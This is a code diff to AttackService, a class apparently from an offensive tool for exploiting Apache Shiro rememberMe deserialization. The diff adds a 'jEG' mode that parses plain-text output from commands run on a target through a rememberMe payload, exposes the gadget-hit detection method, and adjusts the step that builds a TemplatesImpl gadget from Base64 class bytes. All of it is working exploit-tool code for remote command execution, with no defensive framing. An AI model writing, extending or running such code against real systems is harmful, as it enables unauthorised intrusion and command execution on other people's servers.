@@ -56,6 +56,7 @@ public class AttackService {
     public Integer timeout;
     public static String attackRememberMe = null;
     public static String gadget = null;
+    public static boolean jegMode = false;
     public static String realShiroKey = null;
     public static Map<String, String> globalHeader = null;
     public static String postData = null;
@@ -288,7 +289,7 @@ public class AttackService {
      * TomcatEcho / SpringEcho / AllEcho 等：链执行成功时常在响应头出现 {@code Host: ...} 或正文出现 {@code $$$...$$$}。
      * <p>成功响应里仍可能带有 {@code rememberMe=deleteMe}（Shiro 清理 Cookie），故先判断回显特征，仅当<strong>无</strong>上述特征时才以 {@code deleteMe} 判失败。</p>
      */
-    static boolean responseIndicatesGadgetHit(String probeText) {
+    public static boolean responseIndicatesGadgetHit(String probeText) {
         if (probeText == null || probeText.isEmpty()) {
             return false;
         }
@@ -433,6 +434,7 @@ public class AttackService {
                     });
                     gadget = gadgetOpt;
                     attackRememberMe = rememberMe;
+                    jegMode = false;
                     flag = true;
                 } else {
                     final String failHint;
@@ -1007,6 +1009,21 @@ public class AttackService {
         try {
             String result = this.bodyHttpRequest(header, "");
             appendResponseSummary(logArea, "[Cookie+CMD] 已发送 rememberMe 载荷，", result);
+            if (plainCmd) {
+                // jEG mode: response is plain text body, no $$$ markers or Base64
+                if (result != null) {
+                    int idx = result.indexOf("\n\n");
+                    String body = idx >= 0 ? result.substring(idx + 2).trim() : result.trim();
+                    if (!body.isEmpty()) {
+                        logArea.appendText(Utils.log("[命令结果] " + command + "\n" + body));
+                        logArea.appendText(Utils.log("-------------------------------------------------"));
+                        return body;
+                    }
+                }
+                logArea.appendText(Utils.log("[命令结果] " + command + " (返回为空)"));
+                logArea.appendText(Utils.log("-------------------------------------------------"));
+                return result;
+            }
             if (result != null && result.contains("$$$")) {
                 String[] parts = result.split("\\$\\$\\$");
                 if (parts.length >= 2) {
@@ -1079,7 +1096,6 @@ public class AttackService {
                     try {
                         byte[] classBytes = Base64.decode(raw.trim());
                         Object template = Gadgets.createTemplatesImpl(classBytes);
-                        System.out.println("[jEG] template created, class=" + template.getClass().getName());
                         Class<? extends ObjectPayload> gadgetClazz = resolvePayloadClass(legacyGadget);
                         this.mainController.logTextArea.appendText(Utils.log("[jEG] gadgetClazz=" + (gadgetClazz != null ? gadgetClazz.getName() : "null")));
                         if (gadgetClazz != null) {
